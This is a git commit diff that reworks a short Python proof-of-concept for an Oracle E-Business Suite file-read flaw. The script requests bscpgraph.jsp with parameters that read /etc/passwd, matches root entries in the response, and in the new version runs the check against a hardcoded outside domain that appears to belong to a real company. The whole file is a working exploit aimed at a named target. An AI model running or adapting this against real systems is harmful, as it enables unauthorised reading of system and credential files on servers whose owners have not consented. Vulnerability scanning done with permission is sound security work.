11ae5688c7c37e1c15e610d4352b9d8e341d8d2b
liaolian <coderliao@qq.com>
2023-04-11 19:45:31 +0800

    项目更新与迭代

--- pocs/oracle-ebs-bispgrapgh-file-readScan.py
+++ pocs/oracle-ebs-bispgrapgh-file-readScan.py
@@ -1,19 +1,19 @@
-import requests,re,urllib3
+import requests, re, urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-def scan(baseurl):
-	if baseurl[-1]=="/":
-		baseurl=baseurl
-	else:
-		baseurl=baseurl+"/"
-	url=baseurl+"OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd"
-	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
-	response=requests.get(url,headers=headers,timeout=5,verify=False)
-	if response.status_code == 200 and re.search("root:.*:[0-9]*:[0-9]*:[^:]*",response.text):
-		r0=True
-	else:
-		r0=False
-	if r0:
-		return True
-	else:
-		return False
+
+
+def doCheck(url):
+    if url[-1] != "/":
+        url = url + "/"
+    targetUrl = url + "OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
+    response = requests.get(targetUrl, headers=headers, timeout=5, verify=False)
+    if response.status_code == 200 and re.search("root:.*:[0-9]*:[0-9]*:[^:]*", response.text):
+        return targetUrl
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    print(doCheck("http://gps.oocl.com/"))
